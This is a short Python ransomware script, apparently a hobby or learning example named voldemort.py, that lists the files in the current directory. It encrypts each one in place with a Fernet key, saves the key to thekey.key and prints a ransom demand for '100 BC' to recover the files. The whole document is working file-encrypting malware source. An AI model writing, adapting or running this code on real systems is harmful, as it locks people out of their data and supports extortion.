import os
from cryptography.fernet import Fernet


# Finde Files
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
         files.append(file)
print(files)

key = Fernet.generate_key()
#print(key)

with open('thekey.key', 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_ecryped = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_ecryped)
print("All your base are belong to us! 100 BC required for retrvile?")